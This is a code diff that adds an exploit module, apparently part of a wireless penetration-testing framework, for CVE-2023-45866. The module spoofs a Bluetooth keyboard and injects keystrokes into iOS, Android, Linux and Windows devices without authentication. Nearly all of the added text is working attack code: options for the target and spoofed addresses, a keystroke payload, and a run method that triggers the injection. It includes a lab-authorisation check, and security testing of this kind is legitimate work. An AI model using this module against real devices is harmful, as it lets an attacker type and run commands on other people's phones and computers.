@@ -290,3 +290,65 @@ class BTHIDKeyboardInject:
             "payload": self.payload,
             "reports_sent": sent,
         }
+
+
+# ---------------------------------------------------------------------------
+# WXF Exploit entry point
+# ---------------------------------------------------------------------------
+
+from wirelessxpl.core.exploit import Exploit as _BaseExploit, OptString, OptBool  # noqa: E402
+from wirelessxpl.core.os_guard import OSRequirement, requires_os  # noqa: E402
+from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab  # noqa: E402
+
+
+@requires_os(OSRequirement.LINUX_ONLY)
+class Exploit(_BaseExploit):
+    """CVE-2023-45866 Bluetooth HID Keyboard Injection (keystroke injection)."""
+
+    __info__ = {
+        "name": "Bluetooth HID Keyboard Injection (CVE-2023-45866)",
+        "description": (
+            "Spoofs a Bluetooth HID keyboard and injects keystrokes into "
+            "target devices (iOS, Android, Linux, Windows) without "
+            "authentication. Based on CVE-2023-45866."
+        ),
+        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
+        "references": (
+            "https://github.com/skysafe/reblog/tree/main/cve-2023-45866",
+            "CVE-2023-45866",
+        ),
+        "devices": ("bluetooth", "hid", "keyboard"),
+    }
+
+    target_addr = OptString("", "Target Bluetooth BD_ADDR (XX:XX:XX:XX:XX:XX)")
+    payload = OptString("echo pwned", "Text payload to inject as keystrokes")
+    spoof_addr = OptString("", "Spoofed BD_ADDR (optional, random if empty)")
+    hci_iface = OptString("hci0", "HCI interface to use")
+    i_know_scope = OptBool(False, "Confirm authorized lab environment")
+
+    def check(self) -> str:
+        import shutil
+        tools = [t for t in ("hciconfig", "hcitool", "bluetoothctl") if not shutil.which(t)]
+        if tools:
+            return f"Missing tools: {', '.join(tools)} — install bluez"
+        return "Prerequisites OK (bluez tools found)"
+
+    def run(self) -> None:
+        require_authorised_lab()
+        from wirelessxpl.core.exploit.printer import print_error, print_status, print_success
+        addr = str(self.target_addr).strip()
+        if not addr or len(addr.split(":")) != 6:
+            print_error("Set target_addr to the Bluetooth BD_ADDR of the target device.")
+            return
+        print_status(f"HID Keyboard Inject -> {addr}  payload: {self.payload!r}")
+        injector = BTHIDKeyboardInject(
+            target_addr=addr,
+            payload=str(self.payload),
+            spoof_addr=str(self.spoof_addr) or None,
+            hci_iface=str(self.hci_iface),
+        )
+        result = injector.run()
+        if result.get("success"):
+            print_success(f"Keystrokes injected: {result['reports_sent']} HID reports")
+        else:
+            print_error(f"Injection failed: {result}")
